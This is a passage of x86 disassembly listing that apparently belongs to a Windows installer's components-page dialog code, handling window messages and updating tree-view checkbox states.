  40490c:	ff 75 fc             	push   -0x4(%ebp)
  40490f:	ff 15 30 72 40 00    	call   *0x407230
  404915:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404919:	75 18                	jne    0x404933
  40491b:	6a 05                	push   $0x5
  40491d:	ff 75 f8             	push   -0x8(%ebp)
  404920:	ff 15 60 72 40 00    	call   *0x407260
  404926:	ff 75 f8             	push   -0x8(%ebp)
  404929:	e8 96 f4 ff ff       	call   0x403dc4
  40492e:	e9 83 03 00 00       	jmp    0x404cb6
  404933:	ff 75 fc             	push   -0x4(%ebp)
  404936:	e8 89 f4 ff ff       	call   0x403dc4
  40493b:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  40493e:	33 ff                	xor    %edi,%edi
  404940:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404947:	75 12                	jne    0x40495b
  404949:	33 c9                	xor    %ecx,%ecx
  40494b:	89 7d 10             	mov    %edi,0x10(%ebp)
  40494e:	41                   	inc    %ecx
  40494f:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404956:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404959:	eb 03                	jmp    0x40495e
  40495b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40495e:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404962:	b8 13 04 00 00       	mov    $0x413,%eax
  404967:	74 09                	je     0x404972
  404969:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40496c:	0f 85 e7 00 00 00    	jne    0x404a59
  404972:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404975:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404978:	74 0d                	je     0x404987
  40497a:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404981:	0f 85 d2 00 00 00    	jne    0x404a59
  404987:	f6 05 99 3e 42 00 02 	testb  $0x2,0x423e99
  40498e:	75 76                	jne    0x404a06
  404990:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404993:	74 09                	je     0x40499e
  404995:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404998:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  40499c:	75 68                	jne    0x404a06
  40499e:	33 c9                	xor    %ecx,%ecx
  4049a0:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4049a3:	0f 95 c1             	setne  %cl
  4049a6:	51                   	push   %ecx
  4049a7:	ff 75 fc             	push   -0x4(%ebp)
  4049aa:	e8 9b fc ff ff       	call   0x40464a
  4049af:	3b c7                	cmp    %edi,%eax
  4049b1:	7c 53                	jl     0x404a06
  4049b3:	8b c8                	mov    %eax,%ecx
  4049b5:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4049bb:	8d 54 19 08          	lea    0x8(%ecx,%ebx,1),%edx
  4049bf:	8b 0a                	mov    (%edx),%ecx
  4049c1:	f6 c1 10             	test   $0x10,%cl
  4049c4:	75 40                	jne    0x404a06
  4049c6:	f6 c1 40             	test   $0x40,%cl
  4049c9:	74 14                	je     0x4049df
  4049cb:	81 f1 80 00 00 00    	xor    $0x80,%ecx
  4049d1:	84 c9                	test   %cl,%cl
  4049d3:	79 05                	jns    0x4049da
  4049d5:	83 c9 01             	or     $0x1,%ecx
  4049d8:	eb 08                	jmp    0x4049e2
  4049da:	83 e1 fe             	and    $0xfffffffe,%ecx
  4049dd:	eb 03                	jmp    0x4049e2
  4049df:	83 f1 01             	xor    $0x1,%ecx
  4049e2:	50                   	push   %eax
  4049e3:	89 0a                	mov    %ecx,(%edx)
  4049e5:	e8 93 c7 ff ff       	call   0x40117d
  4049ea:	a1 98 3e 42 00       	mov    0x423e98,%eax
  4049ef:	33 c9                	xor    %ecx,%ecx
  4049f1:	f7 d0                	not    %eax
  4049f3:	41                   	inc    %ecx
  4049f4:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4049fb:	c1 e8 08             	shr    $0x8,%eax
  4049fe:	23 c1                	and    %ecx,%eax
  404a00:	89 4d 10             	mov    %ecx,0x10(%ebp)
  404a03:	89 45 14             	mov    %eax,0x14(%ebp)
  404a06:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  404a09:	74 4e                	je     0x404a59
  404a0b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404a0e:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  404a15:	75 0e                	jne    0x404a25
  404a17:	ff 70 5c             	push   0x5c(%eax)
  404a1a:	57                   	push   %edi
  404a1b:	68 19 04 00 00       	push   $0x419
  404a20:	ff 75 fc             	push   -0x4(%ebp)
  404a23:	ff d6                	call   *%esi
  404a25:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404a28:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  404a2f:	75 28                	jne    0x404a59
  404a31:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404a35:	75 12                	jne    0x404a49
  404a37:	8b 40 5c             	mov    0x5c(%eax),%eax
  404a3a:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404a40:	8d 44 18 08          	lea    0x8(%eax,%ebx,1),%eax
  404a44:	83 08 20             	orl    $0x20,(%eax)
  404a47:	eb 10                	jmp    0x404a59
  404a49:	8b 40 5c             	mov    0x5c(%eax),%eax
  404a4c:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404a52:	8d 5c 18 08          	lea    0x8(%eax,%ebx,1),%ebx
  404a56:	83 23 df             	andl   $0xffffffdf,(%ebx)
  404a59:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404a60:	75 72                	jne    0x404ad4
  404a62:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404a68:	0f 85 48 02 00 00    	jne    0x404cb6
  404a6e:	8b 45 10             	mov    0x10(%ebp),%eax
  404a71:	c1 e8 10             	shr    $0x10,%eax
  404a74:	66 3d 01 00          	cmp    $0x1,%ax
  404a78:	0f 85 38 02 00 00    	jne    0x404cb6
  404a7e:	57                   	push   %edi
  404a7f:	57                   	push   %edi
  404a80:	68 47 01 00 00       	push   $0x147
  404a85:	ff 75 f8             	push   -0x8(%ebp)
  404a88:	ff d6                	call   *%esi
  404a8a:	83 f8 ff             	cmp    $0xffffffff,%eax
  404a8d:	0f 84 23 02 00 00    	je     0x404cb6
  404a93:	57                   	push   %edi
  404a94:	50                   	push   %eax
  404a95:	68 50 01 00 00       	push   $0x150
  404a9a:	ff 75 f8             	push   -0x8(%ebp)
  404a9d:	ff d6                	call   *%esi
  404a9f:	8b d8                	mov    %eax,%ebx
  404aa1:	83 fb ff             	cmp    $0xffffffff,%ebx
  404aa4:	74 08                	je     0x404aae
  404aa6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404aa9:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  404aac:	75 03                	jne    0x404ab1
  404aae:	6a 20                	push   $0x20
  404ab0:	5b                   	pop    %ebx
  404ab1:	53                   	push   %ebx
  404ab2:	e8 e2 c7 ff ff       	call   0x401299
  404ab7:	53                   	push   %ebx
  404ab8:	57                   	push   %edi
  404ab9:	68 20 04 00 00       	push   $0x420
  404abe:	ff 75 08             	push   0x8(%ebp)
  404ac1:	ff d6                	call   *%esi
  404ac3:	c7 45 10 01 00 00 00 	movl   $0x1,0x10(%ebp)
  404aca:	89 7d 14             	mov    %edi,0x14(%ebp)
  404acd:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404ad4:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404adb:	75 0c                	jne    0x404ae9
  404add:	57                   	push   %edi
  404ade:	57                   	push   %edi
  404adf:	68 00 02 00 00       	push   $0x200
  404ae4:	ff 75 fc             	push   -0x4(%ebp)
  404ae7:	ff d6                	call   *%esi
  404ae9:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404af0:	75 32                	jne    0x404b24
  404af2:	a1 54 04 42 00       	mov    0x420454,%eax
  404af7:	3b c7                	cmp    %edi,%eax
  404af9:	74 07                	je     0x404b02
  404afb:	50                   	push   %eax
  404afc:	ff 15 2c 70 40 00    	call   *0x40702c
  404b02:	a1 6c 04 42 00       	mov    0x42046c,%eax
  404b07:	3b c7                	cmp    %edi,%eax
  404b09:	74 07                	je     0x404b12
  404b0b:	50                   	push   %eax
  404b0c:	ff 15 fc 70 40 00    	call   *0x4070fc
  404b12:	89 3d 54 04 42 00    	mov    %edi,0x420454
  404b18:	89 3d 6c 04 42 00    	mov    %edi,0x42046c
  404b1e:	89 3d e0 3e 42 00    	mov    %edi,0x423ee0
  404b24:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404b2b:	0f 85 47 01 00 00    	jne    0x404c78
  404b31:	57                   	push   %edi
  404b32:	57                   	push   %edi
  404b33:	e8 b7 c6 ff ff       	call   0x4011ef
  404b38:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404b3b:	74 07                	je     0x404b44
  404b3d:	6a 08                	push   $0x8
  404b3f:	e8 c7 c8 ff ff       	call   0x40140b
  404b44:	39 7d 14             	cmp    %edi,0x14(%ebp)
  404b47:	74 3f                	je     0x404b88
  404b49:	ff 35 6c 04 42 00    	push   0x42046c
  404b4f:	e8 8e c7 ff ff       	call   0x4012e2
  404b54:	8b d8                	mov    %eax,%ebx
  404b56:	53                   	push   %ebx
  404b57:	e8 3d c7 ff ff       	call   0x401299
  404b5c:	33 c0                	xor    %eax,%eax
  404b5e:	33 c9                	xor    %ecx,%ecx
  404b60:	3b df                	cmp    %edi,%ebx
  404b62:	7e 0e                	jle    0x404b72
  404b64:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404b67:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  404b6a:	74 01                	je     0x404b6d
  404b6c:	41                   	inc    %ecx
  404b6d:	40                   	inc    %eax
  404b6e:	3b c3                	cmp    %ebx,%eax
  404b70:	7c f2                	jl     0x404b64
  404b72:	57                   	push   %edi
  404b73:	51                   	push   %ecx
  404b74:	68 4e 01 00 00       	push   $0x14e
  404b79:	ff 75 f8             	push   -0x8(%ebp)
  404b7c:	ff d6                	call   *%esi
  404b7e:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404b81:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404b88:	57                   	push   %edi
  404b89:	57                   	push   %edi
  404b8a:	e8 60 c6 ff ff       	call   0x4011ef
  404b8f:	a1 6c 04 42 00       	mov    0x42046c,%eax
  404b94:	39 3d ac 3e 42 00    	cmp    %edi,0x423eac
  404b9a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404b9d:	a1 a8 3e 42 00       	mov    0x423ea8,%eax
  404ba2:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  404ba9:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404bac:	0f 8e 9c 00 00 00    	jle    0x404c4e
  404bb2:	8d 58 08             	lea    0x8(%eax),%ebx
  404bb5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404bb8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404bbb:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404bbe:	3b c7                	cmp    %edi,%eax
  404bc0:	74 74                	je     0x404c36
  404bc2:	8b 0b                	mov    (%ebx),%ecx
  404bc4:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404bc7:	f6 c5 01             	test   $0x1,%ch
  404bca:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404bd1:	74 11                	je     0x404be4
  404bd3:	8d 43 10             	lea    0x10(%ebx),%eax
  404bd6:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  404bdd:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404be0:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  404be4:	f6 c1 40             	test   $0x40,%cl
  404be7:	74 05                	je     0x404bee
  404be9:	6a 03                	push   $0x3
  404beb:	58                   	pop    %eax
  404bec:	eb 0e                	jmp    0x404bfc
  404bee:	8b c1                	mov    %ecx,%eax
  404bf0:	83 e0 01             	and    $0x1,%eax
  404bf3:	40                   	inc    %eax
  404bf4:	f6 c1 10             	test   $0x10,%cl
  404bf7:	74 03                	je     0x404bfc
  404bf9:	83 c0 03             	add    $0x3,%eax
  404bfc:	8b d1                	mov    %ecx,%edx
  404bfe:	ff 75 c0             	push   -0x40(%ebp)
  404c01:	c1 e0 0b             	shl    $0xb,%eax
  404c04:	83 e2 08             	and    $0x8,%edx
  404c07:	0b c2                	or     %edx,%eax
  404c09:	8b d1                	mov    %ecx,%edx
  404c0b:	c1 f9 05             	sar    $0x5,%ecx
  404c0e:	03 c0                	add    %eax,%eax
  404c10:	83 e2 20             	and    $0x20,%edx
  404c13:	83 e1 01             	and    $0x1,%ecx
  404c16:	0b c2                	or     %edx,%eax
  404c18:	41                   	inc    %ecx
  404c19:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404c1c:	51                   	push   %ecx
  404c1d:	68 02 11 00 00       	push   $0x1102
  404c22:	ff 75 fc             	push   -0x4(%ebp)
  404c25:	ff d6                	call   *%esi
  404c27:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404c2a:	50                   	push   %eax
  404c2b:	57                   	push   %edi
  404c2c:	68 0d 11 00 00       	push   $0x110d
  404c31:	ff 75 fc             	push   -0x4(%ebp)
  404c34:	ff d6                	call   *%esi
  404c36:	ff 45 f4             	incl   -0xc(%ebp)
  404c39:	81 c3 18 04 00 00    	add    $0x418,%ebx
  404c3f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404c42:	3b 05 ac 3e 42 00    	cmp    0x423eac,%eax
  404c48:	0f 8c 67 ff ff ff    	jl     0x404bb5
  404c4e:	6a 01                	push   $0x1
  404c50:	57                   	push   %edi
  404c51:	ff 75 fc             	push   -0x4(%ebp)
  404c54:	ff 15 40 72 40 00    	call   *0x407240
  404c5a:	a1 5c 36 42 00       	mov    0x42365c,%eax
  404c5f:	39 78 10             	cmp    %edi,0x10(%eax)
  404c62:	74 14                	je     0x404c78
  404c64:	6a 05                	push   $0x5
  404c66:	e8 b2 f9 ff ff       	call   0x40461d
  404c6b:	50                   	push   %eax
  404c6c:	6a fb                	push   $0xfffffffb
  404c6e:	68 ff 03 00 00       	push   $0x3ff
  404c73:	e8 f0 f8 ff ff       	call   0x404568
  404c78:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404c7f:	75 35                	jne    0x404cb6
  404c81:	f6 05 99 3e 42 00 01 	testb  $0x1,0x423e99
  404c88:	74 2c                	je     0x404cb6
  404c8a:	33 c0                	xor    %eax,%eax
  404c8c:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404c90:	8b 35 60 72 40 00    	mov    0x407260,%esi
  404c96:	0f 94 c0             	sete   %al
  404c99:	c1 e0 03             	shl    $0x3,%eax
  404c9c:	8b f8                	mov    %eax,%edi
  404c9e:	57                   	push   %edi
  404c9f:	ff 75 fc             	push   -0x4(%ebp)
  404ca2:	ff d6                	call   *%esi
  404ca4:	57                   	push   %edi
  404ca5:	68 fe 03 00 00       	push   $0x3fe
  404caa:	ff 75 08             	push   0x8(%ebp)
  404cad:	ff 15 2c 72 40 00    	call   *0x40722c
  404cb3:	50                   	push   %eax
  404cb4:	ff d6                	call   *%esi
  404cb6:	ff 75 14             	push   0x14(%ebp)
  404cb9:	ff 75 10             	push   0x10(%ebp)
  404cbc:	ff 75 0c             	push   0xc(%ebp)
  404cbf:	e8 32 f1 ff ff       	call   0x403df6
  404cc4:	5f                   	pop    %edi
  404cc5:	5e                   	pop    %esi
  404cc6:	5b                   	pop    %ebx
  404cc7:	c9                   	leave
  404cc8:	c2 10 00             	ret    $0x10
  404ccb:	55                   	push   %ebp
  404ccc:	8b ec                	mov    %esp,%ebp
  404cce:	81 7d 0c 02 01 00 00 	cmpl   $0x102,0xc(%ebp)
  404cd5:	53                   	push   %ebx
  404cd6:	56                   	push   %esi
  404cd7:	75 17                	jne    0x404cf0
  404cd9:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  404cdd:	75 7d                	jne    0x404d5c
  404cdf:	68 13 04 00 00       	push   $0x413
  404ce4:	e8 f2 f0 ff ff       	call   0x403ddb
  404ce9:	33 c0                	xor    %eax,%eax
  404ceb:	e9 85 00 00 00       	jmp    0x404d75
  404cf0:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404cf7:	be 19 04 00 00       	mov    $0x419,%esi
  404cfc:	75 1e                	jne    0x404d1c
  404cfe:	ff 75 08             	push   0x8(%ebp)
  404d01:	ff 15 ac 71 40 00    	call   *0x4071ac
  404d07:	85 c0                	test   %eax,%eax
